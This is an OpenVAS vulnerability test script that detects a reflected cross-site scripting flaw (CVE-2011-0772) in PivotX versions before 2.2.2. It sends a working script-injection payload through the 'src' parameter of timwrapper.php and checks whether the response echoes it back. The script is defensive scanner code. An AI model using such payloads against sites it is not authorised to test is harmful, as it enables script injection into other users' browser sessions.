##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_pivotx_mult_xss_vuln.nasl 3570 2016-06-21 07:49:45Z benallard $
#
# PivotX Multiple Cross-site Scripting Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
################################i###############################################

tag_impact = "Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in the context of an affected site.
  Impact Level: Application.";
tag_affected = "PivotX version prior to 2.2.2";
tag_insight = "The flaws are due to
  - Input passed to the 'color' parameter in 'pivotx/includes/blogroll.php',
    'src' parameter in 'pivotx/includes/timwrapper.php' is not properly
    sanitised before being returned to the user.";
tag_solution = "Upgrade to PivotX version 2.2.2 or later
  For updates refer to http://pivotx.net/";
tag_summary = "This host is running PivotX and is prone to multiple
  Cross-site Scripting vulnerabilities.";

if(description)
{
  script_id(801735);
  script_version("$Revision: 3570 $");
  script_tag(name:"last_modification", value:"$Date: 2016-06-21 09:49:45 +0200 (Tue, 21 Jun 2016) $");
  script_tag(name:"creation_date", value:"2011-02-08 15:34:31 +0100 (Tue, 08 Feb 2011)");
  script_cve_id("CVE-2011-0772");
  script_bugtraq_id(45996);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("PivotX Multiple Cross-site Scripting Vulnerability");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/43040");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/64975");

  script_tag(name:"qod_type", value:"remote_vul");
  script_summary("Check the exploit string on PivotX");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_pivotx_detect.nasl");
  script_require_ports("Services/www", 80);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
pxPort = get_http_port(default:80);
if(!pxPort){
  exit(0);
}

pxDir = get_dir_from_kb(port:pxPort, app:"PivotX");
if(pxDir)
{
  ## Construct attack request
  pxReq = http_get(port:pxPort, item:string(pxDir, '/pivotx/includes/timwrapper.php?' +
                                          'src="><script>alert("OpenVAS-XSS-Testing");</script>'));
  pxRes = http_keepalive_send_recv(port:pxPort, data:pxReq);

  ## Confirm exploit worked by checking the response
  if(pxRes =~ "HTTP/1\.. 200" && '><script>alert("OpenVAS-XSS-Testing");</script>' >< pxRes)
  {
    security_message(pxPort);
    exit(0);
  }
}
